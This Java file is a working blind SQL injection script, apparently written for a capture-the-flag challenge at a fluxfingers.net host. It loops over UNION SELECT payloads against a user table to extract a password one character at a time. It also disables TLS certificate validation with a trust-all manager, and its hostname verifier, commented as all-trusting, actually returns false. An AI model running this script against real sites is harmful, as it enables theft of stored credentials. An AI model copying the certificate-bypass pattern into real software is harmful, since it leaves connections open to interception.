import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.Reader;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

public class URLFetcher {

	public static void main(String[] args) {
		try {
			TrustManager[] trustAllCerts = new TrustManager[] { new X509TrustManager() {
				public java.security.cert.X509Certificate[] getAcceptedIssuers() {
					return null;
				}

				public void checkClientTrusted(
				java.security.cert.X509Certificate[] certs,
				String authType) {
				}

				public void checkServerTrusted(
				java.security.cert.X509Certificate[] certs,
				String authType) {
				}
			} };
			// Install the all-trusting trust manager
			final SSLContext sc = SSLContext.getInstance("SSL");
			sc.init(null, trustAllCerts, new java.security.SecureRandom());
			HttpsURLConnection
			.setDefaultSSLSocketFactory(sc.getSocketFactory());
			// Create all-trusting host name verifier
			HostnameVerifier allHostsValid = new HostnameVerifier() {

				@Override
				public boolean verify(String arg0, SSLSession arg1) {
					// TODO Auto-generated method stub
					return false;
				}
			};

			HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
			String letters = "";
			for (int j = 6; j < 30; j++) {
				int pos =  j;
				for (int i = 36; i < 127; i++) {
					char look = (char) i;
					URL url;


					url = new URL("https://wildwildweb.fluxfingers.net:1424/?name=%27+UNION+SELECT+email%2C+passwd+FROM+user+WHERE+ASCII%28SUBSTR%28passwd%2C" + pos + "%2C1%29%29%3DASCII%28%27" + look + "%27%29%23&submit=Generate#");
					URLConnection con = url.openConnection();
					final Reader reader = new InputStreamReader(
					con.getInputStream());
					final BufferedReader br = new BufferedReader(reader);
					String line = "";
					boolean found = false;
					while ((line = br.readLine()) != null) {
						if (line.contains("A new password was generated ")) {
							System.out.println(j + " letter is " + look);
							found = true;
							letters = letters + look;
							System.out.println(letters);

							break;
						}

					}

					br.close();
					if(found){
						break;
					}
				}
			}
		} catch (MalformedURLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (KeyManagementException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (NoSuchAlgorithmException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}
}
